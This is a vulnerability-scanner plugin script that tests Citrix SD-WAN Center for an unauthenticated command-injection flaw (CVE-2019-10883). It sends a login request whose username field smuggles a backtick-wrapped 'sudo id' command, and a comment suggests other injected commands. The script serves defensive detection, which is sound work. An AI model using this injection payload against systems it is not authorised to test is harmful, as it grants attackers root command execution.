#
# (C) WebRAY, Inc.
#

include("compat.inc");

if (description)
{
  script_id(124000);
  script_version("1.2");
  script_cvs_date("Date: 2019/04/11 11:47:45");

  script_cve_id("CVE-2019-10883");
  script_xref(name:"TRA", value:"TRA-2019-18");

  script_name(english:"Citrix SD-WAN Center Command Injection");
  script_summary(english:"Attempts to execute a command on the remote host.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a remote command injection
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Citrix SD-WAN Center is affected by a remote command
injection vulnerability due to improper sanitization of user-supplied
input. An unauthenticated, remote attacker can exploit this, via a
specially crafted HTTP request, to execute arbitrary commands on the
remote host with root privileges.");
  script_set_attribute(attribute:"see_also", value:
"https://support.citrix.com/article/CTX247737");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 10.0.7 / 10.2.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2019-10883");

  script_set_attribute(attribute:"vuln_publication_date",value:"2019/04/10");
  script_set_attribute(attribute:"patch_publication_date",value:"2019/04/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/04/11");

  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:citrix:sd-wan-center");
  script_set_attribute(attribute:"exploited_by_GizaNE", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2019 and is owned by WebRAY, Inc. or an Affiliate thereof.");

  script_dependencies("citrix_sdwan_center_detect.nbin");
  script_require_keys("installed_sw/Citrix SD-WAN Center");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("install_func.inc");
include("misc_func.inc");
include("url_func.inc");
include("http.inc");

app = 'Citrix SD-WAN Center';

# Exit if app is not detected on the target host
get_install_count(app_name:app, exit_if_zero:TRUE);
port = get_http_port(default:443);

# Exit if app is not detected on this port
install = get_single_install(
  app_name : app,
  port     : port
);

# Use other commands for vulnerability confirmation.
# Examples: 
#   ping -c 10 <some_host>
#   sudo id > /tmp/test
#
cmd = 'sudo id';
data = '_method=POST&data%5BUser%5D%5Busername%5D='
  + '%60' + urlencode(str:cmd) + '%60'
  + '&data%5BUser%5D%5Bpassword%5D=pwd&data%5BUser%5D%5BsecPassword%5D=pwd2';
http_set_read_timeout(20);
res = http_send_recv3(
  method        : 'POST',
  item          : '/login',
  data          : data,
  content_type  : 'application/x-www-form-urlencoded',
  port          : port,
  exit_on_fail  : TRUE);

if (res[2] =~ 'Failed to retrieve level for local user.*' + cmd)
{
  security_report_v4(
    port: port,
    severity: SECURITY_HOLE,
    generic: TRUE,
    request: make_list(http_last_sent_request())
  );
}
else
{
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:install['path'], port:port));
}
